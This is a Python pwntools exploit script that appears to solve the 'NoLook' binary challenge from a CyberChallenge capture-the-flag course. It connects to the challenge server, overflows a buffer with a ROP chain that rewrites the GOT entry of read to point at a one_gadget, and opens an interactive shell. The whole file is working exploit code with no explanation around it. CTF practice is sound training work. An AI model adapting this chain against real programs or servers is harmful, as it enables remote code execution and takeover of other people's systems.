from pwn import *

exe = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 10/NoLook/nolook")
libc = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 10/NoLook/libc.so.6")  # import libc file
context.binary = exe
HOST = "nolook.challs.cyberchallenge.it"
PORT = 6015
r = remote(HOST, PORT)

p = make_packer(64, endian='little', sign='signed')  # used to convert all in a bit

print("\n[+] Exploiting...")

local_read_addr = 0x001f0aa0  # local address of function "read"
remote_read_addr = 0x00210070  # remote address of function "read"
one_gadg_rel = 0x14f322  # address found with one_gadget to spawn shell
local_one_gadg_rel = 0x1cd7b0  # relative address of spawn shell function
local_offset = local_one_gadg_rel - local_read_addr  # finding the local offset
remote_offset = one_gadg_rel - remote_read_addr  # finding the remote offset

read_loc = 0x0000000000601018  # address of read function

read_instr_addr = 0x000000000040060c

offset = 24

popr14_r15 = p64(0x0000000000400680)  #: pop r14; pop r15; ret;
add_r14_r15 = p64(0x00000000004005af)  #: add qword ptr [r14 + 0x90], r15; ret;

# Build the ROPchain
chain = (
        b"A" * offset +
        popr14_r15 +
        p64(read_loc - 0x90) +
        p(remote_offset) +
        add_r14_r15 +
        p64(read_instr_addr) +
        b"\x00" * 100  # add 100 "\n"
)

r.sendline(chain)
r.interactive()
